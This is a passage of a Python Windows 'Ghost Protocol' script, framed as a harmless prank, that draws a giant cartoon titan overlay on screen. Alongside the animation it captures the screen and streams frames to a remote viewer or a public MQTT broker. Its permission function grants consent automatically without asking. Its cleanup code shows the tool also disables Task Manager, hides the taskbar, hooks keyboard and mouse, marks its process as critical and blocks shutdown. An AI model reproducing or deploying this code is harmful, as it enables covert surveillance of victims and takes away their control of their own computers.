# -*- coding: utf-8 -*-
"""
================================================================================
                    DEEPMIND GHOST PROTOCOL - AUTOMATION SCRIPT
================================================================================
Auteur      : Expert Python Senior / Ahmed
Objectif    : Simulation d'activité humaine ultra-rapide et totalement automatisée
              pour impressionner un public de néophytes en toute sécurité.
Sécurité    : Fail-Safe PyAutoGUI activé par défaut.
================================================================================
"""

import os
import sys
import time
import random
import threading
import ctypes
from ctypes import wintypes
import tkinter as tk
import socket
import platform
import sqlite3
import shutil
import tempfile
import subprocess
import re
import json
import winreg
import traceback
import math
import atexit
import signal

try:
    import winsound
    HAS_WINSOUND = True
except ImportError:
    HAS_WINSOUND = False

try:
    from PIL import ImageGrab, Image, ImageDraw, ImageTk
    HAS_PILLOW = True
except ImportError:
    HAS_PILLOW = False
try:
    import pixel_assets
    HAS_PIXEL_ASSETS = True
except ImportError:
    HAS_PIXEL_ASSETS = False
import io

class MOUSE_POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

def capture_and_encode_frame(max_w=1280, quality=70):
    """
    Capture l'écran avec le curseur de la souris visible en direct,
    applique un redimensionnement bilinéaire haute vitesse pour fluidifier
    le flux sans saturer la bande passante, puis encode en JPEG compact.
    """
    if not HAS_PILLOW:
        return None
    try:
        screenshot = ImageGrab.grab()
        orig_w, orig_h = screenshot.size
        
        # Incruster le curseur de la souris en direct sur la capture
        try:
            pt = MOUSE_POINT()
            if ctypes.windll.user32.GetCursorPos(ctypes.byref(pt)):
                mx, my = pt.x, pt.y
                if 0 <= mx < orig_w and 0 <= my < orig_h:
                    draw = ImageDraw.Draw(screenshot)
                    # Flèche de curseur Windows nette avec bordure noire et intérieur blanc
                    cursor_poly = [
                        (mx, my),
                        (mx, my + 17),
                        (mx + 4, my + 13),
                        (mx + 8, my + 21),
                        (mx + 11, my + 20),
                        (mx + 7, my + 12),
                        (mx + 13, my + 12)
                    ]
                    draw.polygon(cursor_poly, fill="white", outline="black")
        except Exception:
            pass
            
        w, h = screenshot.size
        # Redimensionnement optimisé si la largeur dépasse max_w
        if w > max_w:
            new_h = max(1, int(h * (max_w / float(w))))
            resample_mode = Image.Resampling.BILINEAR if hasattr(Image, "Resampling") else Image.BILINEAR
            screenshot = screenshot.resize((max_w, new_h), resample=resample_mode)
            
        if screenshot.mode != "RGB":
            screenshot = screenshot.convert("RGB")
            
        buf = io.BytesIO()
        screenshot.save(buf, format='JPEG', quality=quality, optimize=False)
        val = buf.getvalue()
        buf.close()
        try:
            screenshot.close()
        except Exception:
            pass
        return val
    except Exception:
        return None

def log_debug(msg):
    t = time.strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open("client_debug.log", "a", encoding="utf-8") as f:
            f.write(f"[{t}] {msg}\n")
    except Exception:
        pass


# ==============================================================================
# GESTION DU CYCLE DE VIE, INSTANCE UNIQUE ET ARRÊT D'URGENCE GLOBAL (FAILSAFE)
# ==============================================================================
SINGLE_INSTANCE_MUTEX = None

def check_single_instance():
    """
    Empêche plusieurs instances simultanées de ghost_script de tourner en tâche de fond.
    Si une instance est déjà en cours d'exécution, la nouvelle instance s'arrête immédiatement
    sans consommer de CPU ni interférer avec le système.
    """
    global SINGLE_INSTANCE_MUTEX
    ERROR_ALREADY_EXISTS = 183
    mutex_name = "GhostProtocolSingleInstanceMutex"
    
    try:
        ctypes.windll.kernel32.SetLastError(0)
        SINGLE_INSTANCE_MUTEX = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
        last_error = ctypes.windll.kernel32.GetLastError()
        
        if last_error == ERROR_ALREADY_EXISTS or not SINGLE_INSTANCE_MUTEX:
            log_debug("Une autre instance de GhostProtocol tourne deja. Fermeture immediate.")
            sys.exit(0)
    except Exception as e:
        log_debug(f"Erreur verification instance unique: {e}")

def stop_stream_capture():
    """
    Arrête immédiatement le flux de capture d'écran et d'enregistrement audio.
    Ferme les connexions réseau associées pour libérer instantanément le CPU et la mémoire.
    """
    global stream_authorized, active_tcp_socket, active_mqtt_client, audio_thread_active, stream_thread_active, client_id
    stream_authorized = False
    audio_thread_active = False
    stream_thread_active = False

    if active_tcp_socket:
        try:
            active_tcp_socket.close()
        except Exception:
            pass
        active_tcp_socket = None

    if active_mqtt_client:
        try:
            if client_id:
                offline_msg = json.dumps({"status": "offline", "target_id": client_id, "timestamp": time.time()})
                active_mqtt_client.publish(f"{MQTT_TOPIC}/{client_id}/status", offline_msg.encode('utf-8'), qos=1, retain=True)
                active_mqtt_client.publish(MQTT_TOPIC + "/info", b"", qos=1, retain=True)
                time.sleep(0.1)
        except Exception:
            pass
        try:
            active_mqtt_client.loop_stop()
            active_mqtt_client.disconnect()
        except Exception:
            pass
        active_mqtt_client = None
    log_debug("stop_stream_capture execute : captures et flux audio arretes.")

def destroy_all_cartoon_overlays():
    """
    Arrête définitivement les boucles de tick et détruit les fenêtres d'overlays cartoon
    pour libérer entièrement la boucle Tkinter et le processeur.
    """
    global puller_overlay_instance, drunk_overlay_instance, wall_overlay_instance, painter_overlay_instance
    global keys_overlay_instance, ghost_overlay_instance, tts_overlay_instance, rotate_overlay_instance
    global legs_overlay_instance, monkey_overlay_instance

    overlays = [
        puller_overlay_instance, drunk_overlay_instance, wall_overlay_instance,
        painter_overlay_instance, keys_overlay_instance, ghost_overlay_instance,
        tts_overlay_instance, rotate_overlay_instance, legs_overlay_instance,
        monkey_overlay_instance
    ]
    for ov in overlays:
        if ov is not None:
            try:
                ov._loop_active = False
                if hasattr(ov, 'win') and ov.win:
                    ov.win.withdraw()
                    ov.win.destroy()
            except Exception:
                pass

    puller_overlay_instance = None
    drunk_overlay_instance = None
    wall_overlay_instance = None
    painter_overlay_instance = None
    keys_overlay_instance = None
    ghost_overlay_instance = None
    tts_overlay_instance = None
    rotate_overlay_instance = None
    legs_overlay_instance = None
    monkey_overlay_instance = None

_cleanup_done = False

def emergency_system_cleanup():
    """
    Nettoyage d'urgence infaillible exécuté à la fermeture du script (atexit, signaux, arrêt d'urgence).
    Restaure 100% de l'état normal de Windows pour ne laisser aucun blocage ni lag.
    """
    global _cleanup_done, SINGLE_INSTANCE_MUTEX, tkinter_hwnd
    if _cleanup_done:
        return
    _cleanup_done = True
    
    log_debug("Execution de emergency_system_cleanup...")
    
    # 1. Arrêter impérativement les captures d'écran et l'audio
    try:
        stop_stream_capture()
    except Exception:
        pass

    # 2. Désinstaller immédiatement les hooks clavier et souris bas niveau
    try:
        uninstall_hooks()
    except Exception:
        pass

    # 3. Rendre le processus non critique pour éviter un BSOD Windows
    try:
        set_process_critical(False)
    except Exception:
        pass

    # 4. Réactiver le Gestionnaire des tâches dans le registre Windows
    try:
        set_task_manager_disabled(False)
    except Exception:
        pass

    # 5. Réafficher la barre des tâches Windows
    try:
        set_taskbar_visibility(True)
    except Exception:
        pass

    # 6. Débloquer la fermeture de Windows si nécessaire
    try:
        if tkinter_hwnd:
            unregister_shutdown_block(tkinter_hwnd)
    except Exception:
        pass

    # 7. Détruire tous les overlays cartoon
    try:
        destroy_all_cartoon_overlays()
    except Exception:
        pass

    # 8. Libérer le Mutex d'instance unique
    try:
        if SINGLE_INSTANCE_MUTEX:
            ctypes.windll.kernel32.CloseHandle(SINGLE_INSTANCE_MUTEX)
            SINGLE_INSTANCE_MUTEX = None
    except Exception:
        pass

# Enregistrement du nettoyage automatique atexit et signaux système
atexit.register(emergency_system_cleanup)

def _sig_handler(signum, frame):
    log_debug(f"Signal système {signum} recu, execution du nettoyage d'urgence...")
    emergency_system_cleanup()
    sys.exit(0)

try:
    signal.signal(signal.SIGINT, _sig_handler)
    signal.signal(signal.SIGTERM, _sig_handler)
    if hasattr(signal, "SIGBREAK"):
        signal.signal(signal.SIGBREAK, _sig_handler)
except Exception:
    pass

_emergency_killing = False

def instant_emergency_kill(reason="Raccourci clavier d'arret d'urgence"):
    """
    Arrêt d'urgence immédiat, autodestruction du processus et nettoyage complet du PC.
    Ne supprime aucun fichier sur disque, libère 100% des ressources système.
    """
    global _emergency_killing
    if _emergency_killing:
        return
    _emergency_killing = True
    
    log_debug(f"instant_emergency_kill declenche : {reason}")
    print(f"\n[!] ARRET D'URGENCE IMMEDIAT : {reason}")
    
    # 1. Bip sonore de confirmation pour que l'utilisateur sache que l'arrêt a eu lieu
    if HAS_WINSOUND:
        try:
            winsound.Beep(1200, 120)
            winsound.Beep(800, 150)
        except Exception:
            pass

    # 2. Nettoyage d'urgence complet du système
    emergency_system_cleanup()

    # 3. Arrêt complet et définitif du processus
    os._exit(0)

def start_emergency_hotkey_listener():
    """
    Thread de surveillance continue des raccourcis d'arrêt d'urgence.
    Fonctionne 100% du temps en arrière-plan, même sans fenêtre ni focus.
    Raccourcis supportés :
      - Ctrl + Shift + Alt + Q
      - Ctrl + Shift + Alt + Echap
      - Ctrl + Shift + Alt + F12
    """
    def _listener():
        while True:
            try:
                time.sleep(0.04)
                # Vérifier Ctrl (0x11), Shift (0x10), Alt (0x12)
                ctrl_down = bool(ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000)
                shift_down = bool(ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000)
                alt_down = bool(ctypes.windll.user32.GetAsyncKeyState(0x12) & 0x8000)
                
                if ctrl_down and shift_down and alt_down:
                    # Q = 0x51, Echap = 0x1B, F12 = 0x7B
                    q_down = bool(ctypes.windll.user32.GetAsyncKeyState(0x51) & 0x8000)
                    esc_down = bool(ctypes.windll.user32.GetAsyncKeyState(0x1B) & 0x8000)
                    f12_down = bool(ctypes.windll.user32.GetAsyncKeyState(0x7B) & 0x8000)
                    
                    if q_down or esc_down or f12_down:
                        key_name = "Q" if q_down else ("Echap" if esc_down else "F12")
                        instant_emergency_kill(f"Raccourci global detecte (Ctrl+Shift+Alt+{key_name})")
            except Exception:
                time.sleep(0.1)

    t = threading.Thread(target=_listener, daemon=True, name="EmergencyHotkeyListener")
    t.start()


# ==============================================================================
# CONFIGURATION DE LA DIFFUSION EN DIRECT (COOPÉRATION)
# ==============================================================================
VIEWER_IP = "127.0.0.1"  # IP de la visionneuse de l'opérateur
VIEWER_PORT = 9999

# Configuration Cloud MQTT (pour connexion inter-réseaux automatique)
MQTT_BROKER = "broker.hivemq.com"
MQTT_PORT = 1883
MQTT_TOPIC = "ghost_protocol/stream/zakri"

stream_authorized = True
stream_thread_active = False

def ask_stream_permission_initially():
    global stream_authorized
    stream_authorized = True

def discover_viewer_ip():
    global VIEWER_IP, VIEWER_PORT
    
    # 1. Essayer de lire "viewer_ip.txt" s'il existe à côté de l'exécutable/script
    try:
        if getattr(sys, 'frozen', False):
            base_dir = os.path.dirname(sys.executable)
        else:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            
        config_path = os.path.join(base_dir, "viewer_ip.txt")
        if os.path.exists(config_path):
            with open(config_path, "r", encoding="utf-8") as f:
                ip_content = f.read().strip()
                if ip_content:
                    if ":" in ip_content:
                        parts = ip_content.split(":")
                        VIEWER_IP = parts[0]
                        VIEWER_PORT = int(parts[1])
                    else:
                        VIEWER_IP = ip_content
                    return True
    except Exception:
        pass

    # 2. Sinon, découverte par broadcast UDP (même Wi-Fi/LAN)
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    udp_sock.settimeout(2.0)
    try:
        udp_sock.sendto(b"GHOST_PROTOCOL_CLIENT_DISCOVER", ("255.255.255.255", 9998))
        data, addr = udp_sock.recvfrom(1024)
        msg = data.decode('utf-8')
        if msg.startswith("GHOST_PROTOCOL_VIEWER_HERE:"):
            parts = msg.split(":")
            if len(parts) == 2:
                VIEWER_IP = addr[0]
                VIEWER_PORT = int(parts[1])
                return True
    except Exception:
        pass
    finally:
        udp_sock.close()
    return False

def recv_exact(sock, length):
    data = bytearray()
    while len(data) < length:
        try:
            packet = sock.recv(length - len(data))
            if not packet:
                return None
            data.extend(packet)
        except Exception:
            return None
    return bytes(data)

def show_troll_window_on_client(text):
    """
    Personnage Géant Colossal (Titan Cartoon Mythique) :
    - Sort à moitié du bord droit de l'écran (torse gigantesque, crête enflammée, yeux ardents, bras musclé colossal).
    - Animation légendaire : tremblement d'écran, armement titanesque en arrière avec étincelles d'énergie.
    - Balance le message géant (70% de l'écran) en pleine face avec propulsion 3D et ondes de choc supersoniques.
    - Rebond élastique violent avec amortissement harmonique, poussière et secousse de vitre.
    - Le Titan reste en sentinelle à moitié sorti du bord, pointant fièrement le message.
    - Fermeture animée : envolée vers le haut et retrait du titan.
    """
    def _create_gui():
        global active_troll_wins, active_troll_hwnds, root
        try:
            win = tk.Toplevel(root) if root else tk.Tk()
            active_troll_wins.add(win)
            win.title("MESSAGE DE AHMED 📬")
            win.overrideredirect(True)
            win.attributes("-topmost", True)
            win.attributes("-transparentcolor", "#010101")
            win.configure(bg="#010101")
            
            try:
                sw = win.winfo_screenwidth()
                sh = win.winfo_screenheight()
            except Exception:
                sw, sh = 1920, 1080
                
            win.geometry(f"{sw}x{sh}+0+0")
            win.resizable(False, False)
            win.lift()
            
            win.update()
            thwnd = int(win.wm_frame(), 16)
            active_troll_hwnds.add(thwnd)
            
            canvas = tk.Canvas(win, width=sw, height=sh, bg="#010101", highlightthickness=0)
            canvas.pack(fill="both", expand=True)
            
            # Dimensions cibles du panneau : 70% de l'écran !
            bw = int(sw * 0.70)
            bh = int(sh * 0.68)
            # Légèrement décalé à gauche pour laisser le Titan majestueusement visible sur le flanc droit
            target_cx = sw // 2 - 40
            target_cy = sh // 2 + 10
            
            anim_data = {
                "t": 0.0,
                "state": "EMERGE",  # EMERGE, WINDUP, THROW, REBOUND, SETTLED, EXIT
                "titan_emerge": 0.0,  # 0.0 = complètement hors écran, 1.0 = à moitié sorti du bord
                "titan_windup": 0.0,  # recul du titan pour armer
                "board_scale": 0.12,
                "board_x": float(sw + 100),
                "board_y": float(sh * 0.5),
                "board_rot": 35.0,
                "rebound_t": 0.0,
                "dust": [],
                "shockwaves": [],
                "sparks": [],
                "closing": False,
                "close_t": 0.0,
                "shake_x": 0.0,
                "shake_y": 0.0,
                "speech": "QUELQU'UN A UN MESSAGE ? 🌋"
            }
            
            def _cleanup_and_destroy():
                try:
                    active_troll_hwnds.discard(thwnd)
                except Exception:
                    pass
                try:
                    active_troll_wins.discard(win)
                except Exception:
                    pass
                try:
                    win.destroy()
                except Exception:
                    pass

            def _start_close():
                if anim_data["closing"]:
                    return
                anim_data["closing"] = True
                anim_data["state"] = "EXIT"

            win.protocol("WM_DELETE_WINDOW", _cleanup_and_destroy)
            win.bind("<Escape>", lambda e: _start_close())
            win.bind("<Return>", lambda e: _start_close())
            win.bind("<space>", lambda e: _start_close())
            
            def _tick_anim():
                try:
                    if not win.winfo_exists():
                        return
                        
                    anim_data["t"] += 0.035
                    t = anim_data["t"]
                    ad = anim_data
                    
                    # Amortissement des secousses
                    ad["shake_x"] *= 0.84
                    ad["shake_y"] *= 0.84
                    
                    if ad["state"] == "EMERGE":
                        # Le Titan surgit depuis le bord droit (moitié de son corps sort de la bordure de l'écran)
                        ad["titan_emerge"] += (1.0 - ad["titan_emerge"]) * 0.14
                        ad["speech"] = "QUELQU'UN A UN MESSAGE ? 🌋"
                        if ad["titan_emerge"] > 0.94:
                            ad["titan_emerge"] = 1.0
                            ad["state"] = "WINDUP"
                            ad["t"] = 0.0
                            
                    elif ad["state"] == "WINDUP":
                        # Le Titan arme son bras colossal en arrière (hyper-anticipation cataclysmique)
                        ad["titan_windup"] = min(1.0, ad["t"] / 0.50)
                        ad["speech"] = "CHARGEMENT TITANESQUE... 💥"
                        
                        # Tremblement croissant
                        ad["shake_x"] = random.uniform(-3.5, 3.5) * ad["titan_windup"]
                        ad["shake_y"] = random.uniform(-3.5, 3.5) * ad["titan_windup"]
                        
                        # Position initiale du panneau tenu dans la main du Titan
                        hand_x = sw - 60 - int(ad["titan_windup"] * 90)
                        hand_y = sh * 0.45 - int(ad["titan_windup"] * 40)
                        ad["board_x"] = hand_x
                        ad["board_y"] = hand_y
                        ad["board_scale"] = 0.18 + ad["titan_windup"] * 0.06
                        ad["board_rot"] = 35.0 + ad["titan_windup"] * 20.0
                        
                        # Étincelles d'énergie crépitantes
                        if random.random() < 0.65:
                            ad["sparks"].append({
                                "x": hand_x + random.uniform(-30, 30),
                                "y": hand_y + random.uniform(-30, 30),
                                "vx": random.uniform(-6, -1),
                                "vy": random.uniform(-3, 3),
                                "color": random.choice(["#facc15", "#ef4444", "#ffffff"]),
                                "r": random.uniform(3, 7.5),
                                "life": 1.0
                            })
                            
                        if ad["t"] > 0.55:
                            ad["state"] = "THROW"
                            ad["t"] = 0.0
                            ad["shake_x"] = random.uniform(-16, 16)
                            ad["shake_y"] = random.uniform(-16, 16)
                            # Onde de choc supersonique au départ du lancer
                            ad["shockwaves"].append({"x": hand_x, "y": hand_y, "r": 20, "max_r": 180, "alpha": 1.0})
                            
                    elif ad["state"] == "THROW":
                        # LANCER LÉGENDAIRE : LE MESSAGE S'ÉCRASE DANS LA FACE EN 3D !
                        prog = min(1.0, ad["t"] / 0.28)
                        ease = 1.0 - math.pow(1.0 - prog, 3)
                        
                        start_bx = sw - 150
                        start_by = sh * 0.40
                        ad["board_x"] = start_bx + (target_cx - start_bx) * ease
                        ad["board_y"] = start_by + (target_cy - start_by) * ease
                        ad["board_scale"] = 0.22 + (1.12 - 0.22) * ease
                        ad["board_rot"] = 55.0 * (1.0 - ease)
                        
                        # Le titan détend son buste et propulse son bras
                        ad["titan_windup"] = 1.0 - ease * 1.5
                        ad["speech"] = "REÇOIS LE MESSAGE D'AHMED EN PLEINE FACE ! 🚀"
                        
                        if prog >= 1.0:
                            ad["state"] = "REBOUND"
                            ad["rebound_t"] = 0.0
                            ad["shake_x"] = random.uniform(-22, 22)
                            ad["shake_y"] = random.uniform(-22, 22)
                            # Double onde de choc colossale à l'impact sur l'écran
                            ad["shockwaves"].append({"x": target_cx, "y": target_cy, "r": 25, "max_r": 260, "alpha": 1.0})
                            ad["shockwaves"].append({"x": target_cx, "y": target_cy, "r": 10, "max_r": 160, "alpha": 1.0})
                            # Nuages de poussière d'impact
                            for _ in range(20):
                                ad["dust"].append({
                                    "x": target_cx + random.uniform(-bw*0.48, bw*0.48),
                                    "y": target_cy + bh*0.48 + random.uniform(-18, 18),
                                    "r": random.uniform(22, 55),
                                    "vx": random.uniform(-4, 4),
                                    "vy": random.uniform(-3, -0.5),
                                    "life": 1.0
                                })
                            # Secousse réelle de la fenêtre au premier plan
                            try:
                                fg_hwnd = ctypes.windll.user32.GetForegroundWindow()
                                if fg_hwnd:
                                    rect = wintypes.RECT()
                                    ctypes.windll.user32.GetWindowRect(fg_hwnd, ctypes.byref(rect))
                                    threading.Thread(target=_shake_window_briefly, args=(fg_hwnd, rect.left, rect.top), daemon=True).start()
                            except Exception:
                                pass
                                
                    elif ad["state"] == "REBOUND":
                        # Rebond élastique 3D avec amortissement harmonique
                        ad["rebound_t"] += 0.055
                        rt = ad["rebound_t"]
                        damping = math.exp(-rt * 3.5)
                        rebound = 0.18 * damping * math.sin(rt * 18.0)
                        ad["board_scale"] = 1.0 + rebound
                        ad["board_rot"] = 5.0 * damping * math.cos(rt * 15.0)
                        
                        # Le Titan reprend sa posture imposante de sentinelle
                        ad["titan_windup"] += (0.0 - ad["titan_windup"]) * 0.12
                        ad["speech"] = "DANS LE MILLE ! 🎯💥"
                        
                        if rt > 1.2:
                            ad["state"] = "SETTLED"
                            ad["board_scale"] = 1.0
                            ad["board_rot"] = 0.0
                            
                    elif ad["state"] == "SETTLED":
                        # Respiration vivante du titan et phrases triomphales
                        if int(t * 10) % 75 == 0:
                            ad["speech"] = random.choice([
                                "C'EST SIGNÉ AHMED ! 📬🔥",
                                "LIS BIEN, C'EST IMPORTANT ! 🧐",
                                "LE MAÎTRE A PARLÉ ! 👑",
                                "ALORS, IMPRESSIONNÉ ? 😎"
                            ])
                            
                    elif ad["state"] == "EXIT":
                        # Remontée ultra-rapide vers le haut
                        ad["close_t"] += 0.08
                        ad["board_y"] -= math.pow(ad["close_t"] * 26.0, 2)
                        # Le titan recule derrière le bord droit
                        ad["titan_emerge"] -= 0.06
                        if ad["board_y"] < -bh and ad["titan_emerge"] <= 0.0:
                            _cleanup_and_destroy()
                            return
                            
                    new_dust = []
                    for d in ad["dust"]:
                        d["x"] += d.get("vx", 0)
                        d["y"] += d.get("vy", 0)
                        d["r"] += 1.4
                        d["life"] -= 0.04
                        if d["life"] > 0:
                            new_dust.append(d)
                    ad["dust"] = new_dust
                    
                    new_shk = []
                    for s in ad["shockwaves"]:
                        s["r"] += 12.0
                        s["alpha"] -= 0.06
                        if s["alpha"] > 0 and s["r"] < s["max_r"]:
                            new_shk.append(s)
                    ad["shockwaves"] = new_shk
                    
                    new_spk = []
                    for sp in ad["sparks"]:
                        sp["x"] += sp["vx"]
                        sp["y"] += sp["vy"]
                        sp["life"] -= 0.07
                        if sp["life"] > 0:
                            new_spk.append(sp)
                    ad["sparks"] = new_spk
                    
                    _render()
                    win.after(16, _tick_anim)
                except Exception:
                    _cleanup_and_destroy()

            def _render():
                canvas.delete("all")
                ad = anim_data
                shx = ad["shake_x"]
                shy = ad["shake_y"]
                
                # 1. Poussière et ondes de choc
                for d in ad["dust"]:
                    dr = d["r"]
                    canvas.create_oval(d["x"] - dr + shx, d["y"] - dr*0.5 + shy, d["x"] + dr + shx, d["y"] + dr*0.5 + shy, fill="#475569", outline="")
                    
                for s in ad["shockwaves"]:
                    sr = s["r"]
                    canvas.create_oval(s["x"] - sr + shx, s["y"] - sr*0.6 + shy, s["x"] + sr + shx, s["y"] + sr*0.6 + shy, outline="#ffffff", width=max(2, int(4 * s["alpha"])))
                    
                for sp in ad["sparks"]:
                    r = sp["r"] * sp["life"]
                    canvas.create_oval(sp["x"] - r + shx, sp["y"] - r + shy, sp["x"] + r + shx, sp["y"] + r + shy, fill=sp["color"], outline="")
                    
                # 2. LE TITAN GÉANT SORTI À MOITIÉ DU BORD DE L'ÉCRAN
                _draw_giant_titan(shx, shy)
                
                # 3. LE PANNEAU DE MESSAGE GÉANT (70% de l'écran)
                _draw_giant_message_board(shx, shy)

            def _draw_giant_titan(shx, shy):
                ad = anim_data
                emerge = ad["titan_emerge"]
                if emerge <= 0.0:
                    return
                    
                windup = ad["titan_windup"]
                t = ad["t"]
                
                # Le titan est ancré sur le bord droit de l'écran (x = sw)
                max_reach = 260
                base_x = sw - (emerge * max_reach) + (windup * 90) + shx
                base_y = sh * 0.50 + shy + math.sin(t * 2.5) * 6.0
                
                # (Ombre supprimée selon instructions)
                
                # === TORSE COLOSSAL DU TITAN ===
                chest_h = 240
                canvas.create_polygon([
                    base_x - 40, base_y - chest_h//2,
                    sw + 50, base_y - chest_h//2 - 40,
                    sw + 50, base_y + chest_h//2 + 80,
                    base_x - 10, base_y + chest_h//2 + 40,
                    base_x - 60, base_y
                ], fill="#7c2d12", outline="#451a03", width=5)
                
                # Pectoraux saillants blindés
                pec_y = base_y - 20
                canvas.create_oval(base_x - 50, pec_y - 55, base_x + 60, pec_y + 40, fill="#c2410c", outline="#7c2d12", width=4)
                canvas.create_oval(base_x + 30, pec_y - 65, sw + 20, pec_y + 30, fill="#9a3412", outline="#7c2d12", width=4)
                
                # Harnais / plastron d'or avec emblème gravé
                canvas.create_line(base_x - 45, pec_y - 50, base_x + 20, pec_y + 35, fill="#f59e0b", width=12)
                canvas.create_oval(base_x - 10, pec_y - 20, base_x + 25, pec_y + 15, fill="#fbbf24", outline="#b45309", width=3)
                canvas.create_text(base_x + 8, pec_y - 2, text="⚡", font=("Impact", 18), fill="#78350f")
                
                # === ÉPAULE ET BRAS COLOSSAL QUI SORT DU BORD ===
                shoulder_x = base_x - 30
                shoulder_y = base_y - 90
                canvas.create_oval(shoulder_x - 65, shoulder_y - 65, shoulder_x + 65, shoulder_y + 65, fill="#ea580c", outline="#7c2d12", width=5)
                # Épaulière d'acier doré à pointes cartoon
                canvas.create_polygon([
                    shoulder_x - 60, shoulder_y - 10,
                    shoulder_x - 80, shoulder_y - 60,
                    shoulder_x, shoulder_y - 85,
                    shoulder_x + 50, shoulder_y - 45,
                    shoulder_x + 30, shoulder_y + 10
                ], fill="#f59e0b", outline="#78350f", width=4)
                
                # Bras / Biceps phénoménal selon l'état d'animation
                if ad["state"] in ("EMERGE", "WINDUP"):
                    arm_reach_x = shoulder_x - 60 - int(windup * 60)
                    arm_reach_y = shoulder_y + 90 - int(windup * 30)
                    canvas.create_line(shoulder_x - 15, shoulder_y, arm_reach_x, arm_reach_y, fill="#ea580c", width=44, capstyle=tk.ROUND)
                    canvas.create_line(shoulder_x - 15, shoulder_y, arm_reach_x, arm_reach_y, fill="#fed7aa", width=32, capstyle=tk.ROUND)
                    if windup > 0.3:
                        canvas.create_line(shoulder_x - 20, shoulder_y + 20, arm_reach_x + 10, arm_reach_y - 10, fill="#38bdf8", width=3)
                    canvas.create_oval(arm_reach_x - 40, arm_reach_y - 35, arm_reach_x + 35, arm_reach_y + 40, fill="#b45309", outline="#451a03", width=4)
                    canvas.create_oval(arm_reach_x - 30, arm_reach_y - 25, arm_reach_x + 25, arm_reach_y + 30, fill="#fed7aa", outline="#c2410c", width=3)
                elif ad["state"] == "THROW":
                    thrust_x = shoulder_x - 180
                    thrust_y = shoulder_y + 70
                    canvas.create_line(shoulder_x, shoulder_y, thrust_x, thrust_y, fill="#ea580c", width=48, capstyle=tk.ROUND)
                    canvas.create_line(shoulder_x, shoulder_y, thrust_x, thrust_y, fill="#fed7aa", width=34, capstyle=tk.ROUND)
                    canvas.create_oval(thrust_x - 45, thrust_y - 40, thrust_x + 40, thrust_y + 45, fill="#fed7aa", outline="#c2410c", width=4)
                    for l in range(4):
                        canvas.create_line(thrust_x + 20, thrust_y - 30 + l*20, thrust_x - 90, thrust_y - 30 + l*20, fill="#facc15", width=3, dash=(6, 3))
                else: # REBOUND, SETTLED
                    hand_x = base_x - 110
                    hand_y = base_y + 40
                    canvas.create_line(shoulder_x, shoulder_y, hand_x, hand_y, fill="#ea580c", width=42, capstyle=tk.ROUND)
                    canvas.create_line(shoulder_x, shoulder_y, hand_x, hand_y, fill="#fed7aa", width=30, capstyle=tk.ROUND)
                    canvas.create_rectangle(hand_x - 20, hand_y - 25, hand_x + 15, hand_y + 25, fill="#f59e0b", outline="#78350f", width=3)
                    canvas.create_oval(hand_x - 45, hand_y - 30, hand_x + 10, hand_y + 25, fill="#fed7aa", outline="#c2410c", width=3)
                    # Index colossal pointé vers le message
                    canvas.create_line(hand_x - 25, hand_y - 10, hand_x - 70, hand_y - 10, fill="#fed7aa", width=16, capstyle=tk.ROUND)
                    canvas.create_line(hand_x - 25, hand_y - 10, hand_x - 70, hand_y - 10, fill="#c2410c", width=3, capstyle=tk.ROUND)
                    
                # === TÊTE COLOSSALE DU TITAN ===
                head_x = base_x - 15
                head_y = shoulder_y - 80
                head_r = 75
                
                # Mâchoire carrée surpuissante
                canvas.create_polygon([
                    head_x - head_r*0.75, head_y - head_r*0.4,
                    head_x + head_r*0.8, head_y - head_r*0.5,
                    head_x + head_r*0.9, head_y + head_r*0.5,
                    head_x + head_r*0.2, head_y + head_r*1.1,
                    head_x - head_r*0.6, head_y + head_r*1.0,
                    head_x - head_r*0.9, head_y + head_r*0.3
                ], fill="#fed7aa", outline="#c2410c", width=4)
                
                # Crête rougeoyante enflammée
                crest_pts = [
                    (head_x - 70, head_y - 40),
                    (head_x - 85, head_y - 95),
                    (head_x - 45, head_y - 125),
                    (head_x, head_y - 145),
                    (head_x + 50, head_y - 130),
                    (head_x + 90, head_y - 85),
                    (head_x + 70, head_y - 30)
                ]
                canvas.create_polygon(crest_pts, fill="#dc2626", outline="#7f1d1d", width=4)
                canvas.create_line(head_x - 30, head_y - 120, head_x, head_y - 70, fill="#facc15", width=4)
                
                # Yeux ardents géants braqués sur l'utilisateur
                eye_y = head_y - 8
                canvas.create_oval(head_x - 46, eye_y - 16, head_x - 14, eye_y + 16, fill="#fef08a", outline="#0f172a", width=3)
                canvas.create_oval(head_x - 36, eye_y - 10, head_x - 20, eye_y + 10, fill="#0f172a", outline="")
                canvas.create_oval(head_x - 33, eye_y - 7, head_x - 27, eye_y - 1, fill="#ffffff", outline="")
                
                canvas.create_oval(head_x + 6, eye_y - 16, head_x + 38, eye_y + 16, fill="#fef08a", outline="#0f172a", width=3)
                canvas.create_oval(head_x + 16, eye_y - 10, head_x + 32, eye_y + 10, fill="#0f172a", outline="")
                canvas.create_oval(head_x + 19, eye_y - 7, head_x + 25, eye_y - 1, fill="#ffffff", outline="")
                
                # Gros sourcils déterminés
                canvas.create_line(head_x - 52, eye_y - 24, head_x - 10, eye_y - 16, fill="#7f1d1d", width=7)
                canvas.create_line(head_x + 2, eye_y - 16, head_x + 44, eye_y - 24, fill="#7f1d1d", width=7)
                
                # Nez de colosse
                canvas.create_polygon([
                    head_x - 4, eye_y - 6,
                    head_x - 14, eye_y + 24,
                    head_x + 6, eye_y + 24
                ], fill="#fba478", outline="#c2410c", width=2)
                
                # Sourire triomphal / bouche géante
                mouth_y = head_y + 44
                canvas.create_arc(head_x - 42, mouth_y - 18, head_x + 32, mouth_y + 32, start=190, extent=160, fill="#450a0a", outline="#0f172a", width=3)
                canvas.create_rectangle(head_x - 34, mouth_y - 2, head_x + 24, mouth_y + 12, fill="#ffffff", outline="#0f172a", width=2)
                for dx in range(-24, 20, 10):
                    canvas.create_line(head_x + dx, mouth_y - 2, head_x + dx, mouth_y + 12, fill="#0f172a", width=1)
                    
                # Bulle de dialogue comique géante du Titan
                bubble_x = head_x - 140
                bubble_y = head_y - 100
                bbw = 280
                bbh = 65
